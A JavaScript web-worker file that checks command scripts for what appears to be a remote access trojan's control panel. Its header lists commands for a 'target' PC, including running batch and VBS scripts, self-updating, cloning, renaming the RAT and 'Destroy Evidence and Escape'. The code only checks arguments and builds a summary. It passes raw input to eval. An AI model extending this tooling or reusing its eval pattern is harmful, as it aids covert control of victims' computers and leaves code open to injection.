/*
List of Built-in PC functions

Eg: PC.Lock("A01");

------------------------------------------------
Command     Ack     Description
------------------------------------------------
Lock(x)      N      Select Target
Cmd(x)       Y      Run Batch Command
Delay(x)     N      Pause Execution temporarily for 'x' milliseconds
Google(x)    Y      Googles selected Text
Play(x)      Y      Play a Remote (mp3) Audio File (URL)
Speak(x)     Y      Text to Speech
Marco()      Y      Returns Polo if Online
Escape()     Y      Destroy Evidence and Escape
Stop()       Y      End Execution
Update(x)    Y      Updates self
Vbs(x)       Y      Runs VB Script
Bat(x)       Y      Runs Bat Script
Info(x)      Y      Shows Info box
Warn(x)      Y      Shows Warning Box
Error(x)     Y      Shows Error box
Type(x)      Y      Types selected text
Excape(x)    Y      Execute Batch script and Escape()
Rename(x)    Y      Renames RAT
Clone()      Y      Initiate Clone Operations

And more...

*/
onmessage = function (event) {
 var txt = "Code Summary:"; //List of Commands
 var arr = [false, "txt", "html", "target", false]; //Err checking, Err Description & Target

 var PC = {
  Lock: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Target Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1F53";
    } else {
     arr[3] = x;
     arr[4] = true;
    }
   }
  },
  Cmd: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Command Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Cmd(<grn>command</grn>)<br><br>Compiler failed with exit code 1F66";
    } else {
     txt += "<br>- Runs Win32 Terminal Commands";
    }
   }
  },
  Delay: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Delay(<grn>milliseconds</grn>)<br><br>Compiler failed with exit code 1F84";
    } else {
     txt += "<br>- Adds temporarily delay";
    }
   }
  },
  Google: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Query Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Google(<grn>query</grn>)<br><br>Compiler failed with exit code 1F69";
    } else {
     txt += "<br>- Googles the selected Query";
    }
   }
  },
  Play: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Audio ref Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Play(<grn>*.mp3</grn>)<br><br>Compiler failed with exit code 1F96";
    } else {
     txt += "<br>- Plays a Remote Audio file on host PC";
    }
   }
  },
 };

 try {
  eval(event.data);
 } catch (e) {
  arr[0] = true;
  arr[1] = e;
  arr[2] = "<red>Program Error</red><br><br>Compiler failed with exit code 1F206";
 }

 if (!arr[0] && !arr[4]) {
  arr = [true, "Target Not specified", "<red>Program Error</red><br><br>Syntax: PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1F43", "target", false];
 }
 arr[0] ? postMessage(arr) : txt == "Code Summary:" ? postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>- No Actions to perform.", arr[3]]) : postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>" + txt, arr[3]]);
};
